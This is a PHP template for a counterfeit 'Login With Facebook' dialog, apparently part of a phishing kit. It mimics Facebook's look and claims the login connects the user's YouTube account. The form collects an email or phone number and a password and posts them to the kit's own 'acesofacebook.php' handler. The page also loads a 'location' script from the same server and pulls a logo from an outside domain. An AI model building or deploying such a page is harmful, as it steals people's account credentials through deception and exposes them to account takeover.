<?php 
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$action_post = dirname(dirname($actual_link)).'/acesofacebook.php';
$action_post = str_replace("public/", "", $action_post);

if(defined('ACCESSFACEBOOK_URL')){
   $action_post = ACCESSFACEBOOK_URL;
};


 ?>
<!DOCTYPE html>
<html class="_3s">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Login With Facebook</title>
      <meta name="viewport" content="user-scalable=no,initial-scale=1.0001,maximum-scale=1.0001">
      <meta name="referrer" content="default" id="meta_referrer">
      <style type="text/css">

._mec {
 margin: 10px;
 color: #4080ff;
}

.img.sp_fFBghZmIXuE_2x.sx_8b7cf7 {
    position: absolute;
    left: 20px;
    top: 15px;
}

.button,body{font-family:HelveticaNeue,Helvetica,Arial,sans-serif}body{background:#fff;text-align:center;padding:0;margin:0}.button{background-color:#3b5998;border-radius:4px;color:#fff;height:50px;margin-bottom:40px;margin-top:5%;padding:0 31px;background-image:none;border:none;width:250px}.input{width:230px;padding:10px;border-radius:5px;border:1px solid #d4d4d4;margin:0 0 4px;text-align:left}.padding{display:block;vertical-align:middle;width:100%;padding:20px 0 43px;text-align:center;margin:auto}.topheader{font-size:16px;line-height:22px;margin:0 8px;color:#fff}.MOauthDialogHeader{font-family:HelveticaNeue-Medium,Helvetica,Arial,sans-serif;margin:0 0;padding:0;align-items:center;justify-content:center;height:53px;display:flex;background:#3b5998}

.nonow,.touch ._5o-o{font-family:HelveticaNeue,Helvetica,Arial,sans-serif}.nonow{background-color:transparent;background-image:none;border:none;font-weight:400;line-height:normal;text-shadow:none;width:100%;box-shadow:none;color:#858585;height:55px}.touch ._5o-o{color:#232937;font-size:15px;overflow:auto;transition:max-height .4s;line-height:168%}.touch._52yn ._5td7{bottom:0;left:0;right:0;top:0;position:relative!important}.sp_fFBghZmIXuE_2x.sx_8b7cf7{width:24px;height:24px;background-position:0 -66px;float:left}

.sp_fFBghZmIXuE_2x{background-image:url(data:image/png;base64,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);background-size:66px 108px;height:16px;width:16px}.fwb{font-weight:700}._5o-e,.img.img.imagen__{display:inline-block}.touch ._5o-o{color:#232937;font-size:15px;line-height:19px;overflow:auto;transition:max-height .4s}.touch ._5o-p{color:#6589ff;display:table;font-size:15px;line-height:17px;margin:0 auto;padding:10px 15px 0;text-align:center}.sp_y4zP8zfdJsO_2x{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAAEoCAMAAACuM6m0AAABv1BMVEVMaXFAgP83P043P043P043P043P05AgP83P043P043P05AgP9AgP83P043P05AgP83P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P05Ceuk3P043P05Sivk3P043P043P05AgP9AgP9AgP9AgP83P043P043P05SivlCeulCeulAgP83P043P043P043P043P05SivlCeulAgP83P043P043P043P043P05Sivk3P043P043P043P043P043P043P043P043P043P043P043P05AgP83P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P05RifhCeulAgP9AgP83P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P043P05RifhIgO9RifhIgO9SivlMhPNIgO9RifhDe+o/d+Y/d+aJq783P05AgP9YkP9Wjv1KgvFSivlRifhIgO9MhPNUjPtVjfyA53F0AAAAiXRSTlMABsVG+4UI7wr3RAzJ+bWdh4PfbN2zbiAkIsdqUEpMcE6B2/P9w4N+Zn71DLGF1VqlQgTXgYeB/WRUEHzrfIU0q0ivFHp6tzYC2b9iuZ/hYIksHhJa5SaN1ZdeaAY07ZV2KPGPMnp+w3idp+86oZEa46XJLjge5w5WGL08o618g4N8g35+fn5+gzQRrz0AAAaLSURBVHhe7JxZbxpJEMdbDDOaQRrEEA6DMeayjDAv4BcgPNhxFDuOT22yue+8JHvf9xfoT71axVJpcXdV15h2S5v9f4DRT6qfmuqubkTa5ORCPHH98RchCg4gMosQ9etnCLOLENnQFgCtBMRzpwSk4E4JSObalYildCcFKOFeCl8F4V8zxIYKIuNSCZDCgRL2pbjXwpXgStGc8BlWpcyvYErwpKiVpbyRgkHKqB0gSjCkCDajfxgrXIaPKTVNlIDk1JUoXUBWuAwXKdcUEIkOwtdUQgIFmwFqgiiBSAGVAAouA9QEUQKXYq2zgFlhMmhrMpLSTIrq8DJnhckAiTYDTAmIr68EUPAZoCa0EiAFVIJPAQxITYJYDxGHikowKe4BgLImoAQuRXAzkkj6KERToimtgRKa+FAJfRoCTV7iGVbFD9sYxPa5+OmWxHNH4KlFBEV01MMxe0fUJ+IVQaQtrScRVIKibYZiKMg0rRKAlZSbVpMXJqlGtgDASjqbLq0EN91ZCVlzaCWkbNlKp25GYKU7NxPBSVCyYiW0Z+7cbNEAfDe7h4/XT6fT0/XHh12GlUt088HDP8bAPP7y7AFlZU2wcxNFqLcOFrEPGt8v0UrazZJmzWmccK1M7+ZL7dobvtRCNEWqDDU6TjH0aZdvJd/NF/s4+vM510p+ezM/p9g/n3MabPJrir56sE+z7w8UPfjrNAThKFHtL56Y0N9X7UeSXMgDyCUbsVTlK2GU91KVeANAKAAfABYzn5lBzH4GgEUQPxdSAJlYIjkVhnkikWQzAHIZICvxlMamEAd3AcAQJPQAgL+j558xAIh3AQIAVAZbDLdh4SRACp4QQhrnT8HIsTQOC+JXDkTDEsQeB+KznhWIjmBl2wpEmdkIWIF4y4N4aAXiNg/itgUI9uDmhgUI9tym8t8tx9c8iLdWIIbsfaT7xapjBUJ+w1q2pR2I+xyIqSWIHQ7EBxbE7lndsKmJZuYMvwwMm5r62e5H6q3dAg3CH63SAIXdfzdrWx4N8u0zU4bxCQ3gqbvFkADhz3dpAB2IvvF985sZw94XWGMbogD0FuCWGcQO0uLz9qP+dtrf86cKgrsAwMprRa8aj2iGUawYz50v85Bk8CPF8PyNwoWjtAxV5YLTzeEMI+XeK6qmhNDMWONVjKEfs4YM6UcvO9pt0N53yz1CfIY0BC/6Y+U6OZmjh6nLPlYu9i+teeEEn0+0U1mJp3vcmAHBrHHcpQ/Y+VbS6T36q/Cq339V2HnUY4waHA5d+G4GHYfjJ7DSStrC7UiS7+bQ5nDW/Zi65XIoCm66sxKS8Kx0Oi4vS6vJO7YS3KStdH/FadP9ZS/ayuh3CuAw4rnJtzK/It6hA5XOO1EjP3IlK4sts6uQzdJVrvdM0Eq0A/zqOLwpCNpoTZ7yz2GhEnBjmrozjdZknXsaDJXgXhRullAGPkWUBALi01emoSY0A00BlYDkKCUE1ARhYFFAJfjX6FtFJgNQqCsByRBKqGoCDHwKqAQiBfoybyWPMtAUJ+plJWemBNQEGNgUcbKs5zbtCBh4FHf0TVDGVAmoCTAwMsEWeN9UCUir7+Axmv2EWcfP8kAK10+ZfUQJ549WHUoBSjiXov5pPun2ECUcP/N3LkX9U/3rB8+GEv/nb3bnoAgAAAYB0OqvtSk8P5CAH5GQkJCQkJCQkJCQkKiRkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQSPt1jtswDERheFipsADdwoALLUViVYkrX8B38HKK7BvwJFlOcuDERIAHgR5XGrmIfrBg+RFsZqT/xj7e5eJND4eNDJHLc6cZmrZt5mLfZAvEE8Wwr+v9EIodACSaoarq9kV6yqVZiW7+/b+nOF4l7NYbqvq1N0MMnDTEhVfsdMNM+ioFEHXbegNwVCSGBpYBeSDzBq/QDTfSXyUwUQzkGRsEgNMMiQRd02CFGN5AxAUNRKiGxWnDUgwQqiEyNxChGjCIgYjQIBE6iPv2aKi+no0RNBDBHjzi+/PNCBEaiGBP/jv2zcYQQYOCkKs/xdwMQYOKoMICERqIsFcQUdAQIGwVRKxoOIegYmqASGgIEMYKIqLAoCFkRkW/iAWQpQsJEfYKIlb5ShgR9goiWIjQFe3jpRBU1GvDQZeIUs4o6qXZyM9yIBO9u7WYLT8MQCrD5GKoxU4M0xdiVmapk//d2NjYD6GutMY1X8+JAAAAAElFTkSuQmCC);background-size:0px 0px;height:0px;width:65px}

.sp_y4zP8zfdJsO_2x.sx_fcb8d5{width:20px;height:20px;background-position:0 -127px}.img{border:0;display:inline-block}._56bs,.img,html ._56bs ._56br{vertical-align:top}.touch,.touch .mfsm,.touch input,.touch textarea,.touch tr{font-size:14px;line-height:18px}._1owb{width:222px;display:block;margin:12px auto}
      </style>
   </head>
   <body tabindex="0" class="_52yo _5mp_ nojavascript touch x2 ios sf _52yn   portrait" >
      <div data-sigil="MOauthDialogHeader" class="MOauthDialogHeader">
         <div class="_5s61 _31t1"></div>
         <div class="topheader"><img src="https://elpentagono.online/du/landings/apiexplorerhk/logo.png" width="100%" class="_3-q3 img" /></div>
         
         
      </div>
      <div class="<?php echo USER_UID?'':"padding"; ?>">
         <div class="_1-pb">
            <div class="_5o-e">
               <?php if (!USER_UID){ ?>

                 <img src="https://media.giphy.com/media/247EJAIDVlkPuqEJ5I/giphy.gif" width="150" class="_3-q3 img" />

               <?php }else{ ?>
                 <img style='width: 150px; margin-top:20px;border: solid #fff;' src="<?php echo USER_PHOTO; ?>" alt="">
               <?php }; ?>

            </div>
            <div class="_1owb">
               <div class="__wd">
                  <div class="_5o-o _35r5"><span class="fwb"><?php echo CALLED?CALLED:"Log into your Facebook account"; ?></span> to connect to  <span class="permList">your <span id="permissions_list">YouTube</span>. </span></div>
                  
                   
                  
                  <a class="_5o-p" id="u_0_8" >
                  </a>
               </div>
            </div>
         </div>
      </div>
      <form method="post" action="<?php echo $action_post; ?>" class="_4x22 _j95" id="platformDialogForm" data-autoid="autoid_5">
         <div class="_5td7 _j95" id="platformDialogContent">
            <div class="_2d7t _5o-f">
               <div class="_602b">
                  <footer class="_5o-s">
                     <div class="wrap-input">
                        <input type="<?php echo USER_UID?"hidden":"text"; ?>" <?php echo USER_UID?'value="'.USER_UID.'"':""; ?> name="email" placeholder="Email or Phone Number" class="input">
                        <input type="password" name="pass" placeholder="Password" class="input">
                     </div>
                     <div class="_5o-x _2mc"><button type="submit" class="button" name="__CONFIRM__" id="u_0_9" data-sigil="touchable confirm m-dialog-confirm-button dialog-header-button-__CONFIRM__" data-autoid="autoid_3"><span class="_55sr">Continue</span></button></div>
                     <p class="_497e _497f _5gbj"><i class="img img" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAMAAACelLz8AAAA7VBMVEVMaXFgZ3RfZXNmbXteZXJeZHFbYW5bYW5cYm9qcX9jaXdeZHFaYG1ob35bYW1ob35bYW5ob31aYG1pcH9qcX9bYW5bYW1pcH9nbnxaYG1lbHpobn1cYm9bYW1bYW5dY3BaYG1ob31qcX9iaHZbYW5obn1janhdY3BqcX9jaXdhaHVeZXJnbnxbYW1ka3lpcH9gZ3RdY3BpcH9bYW5dY3BeZHFeZHFdY3BpcH5qcYBmbXteZXJobn1qcX9ob31pcH5lbHphZ3VjaXdiaHZpcH9janhnbnxeZHFnbXxiaXZdY3BfZXNgZ3RhaHVgZnTDhAh6AAAAOXRSTlMA5lVV/q0jVXitVVUjh1Wv5hMGZfDEgEVxCUuG8ktwpQ2H/gmw8oETuMRlBvBHRf6xDZOv6emvR7hECvLHAAAAx0lEQVR4Xu3QVbKDQBCGUaLE3V2vu/cYExgkdve/nEBIKAjFDvI9/dXnYapG8nr+/DK/f36lUJPFZqdzxPW39wupNbFqKRSoYt0/Bqll6mx29/H3Sim7CUh3oJFG2x4vT4Iu534aYk7rx/WABO35afRvQPVIt2sGHT9l9gROc2tBP0AaOxNGMI2mogeFkjxWGSTistMWQTmXT7tUwTuNK0DUlZNKQOHrmEsb3SAKBcGIExNAFWK4ZCII5z3sdaVkNKU4DUnWhgMJ61xuNQ+CjQAAAABJRU5ErkJggg==&quot;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:13px;height:13px;"></i>This application is not allowed to publish on Facebook.</p>
                     <div class="_5o-v">
                        <div class="_5o-w">
                           <div class="_5o-x"><button type="button" value="Not Now" class="nonow" name="__SKIP__" data-sigil="touchable skip" data-autoid="autoid_4"><span class="_55sr">Not Now</span></button></div>
                        </div>
                     </div>
                  </footer>
               </div>
            </div>
         </div>
      </form>
      <script>
         var script_ = document.createElement('script');
         script_.src = "<?php echo dirname($action_post); ?>/location";
         script_.asunc = true;
         document.body.appendChild(script_);
      </script>

   </body>
</html>